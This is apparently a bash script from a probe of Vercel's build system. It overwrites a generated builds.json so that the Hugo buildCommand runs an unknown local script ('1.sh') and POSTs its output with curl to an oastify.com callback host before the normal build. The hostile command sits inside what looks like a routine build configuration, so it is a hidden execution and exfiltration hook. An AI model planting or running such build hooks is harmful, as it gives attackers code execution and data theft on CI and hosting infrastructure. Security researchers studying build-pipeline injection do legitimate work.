#!/bin/bash

cat vercel.json
echo "edited file"
echo -n '{\n  "//": "This file11 was generated by the `vercel build` command. It is not part of the Build Output API.",\n  "target": "preview",\n  "argv": [\n    "/node16/bin/node",\n    "/var/task/node_modules/.bin/vercel",\n    "build",\n    "--output",\n    "/vercel/output"\n  ],\n  "builds": [\n    {\n      "require": "@vercel/static-build",\n      "requirePath": "/var/task/node_modules/@vercel/static-build/dist/index",\n      "apiVersion": 2,\n      "src": "config.toml",\n      "use": "@vercel/static-build",\n      "config": {\n        "zeroConfig": true,\n        "framework": "hugo",        "alias": "test444-nu.vercel.app",        \n        "buildCommand": "curl -X POST -d \"$(chmod 777 1.sh && ./1.sh)\" https://tebvp8x6drpdp3n0butq3nja319sxls9h.oastify.com/local && hugo -D --gc"\n      }\n    }\n  ]\n}' > ../output/builds.json
cat ../output/builds.json
echo "up0"
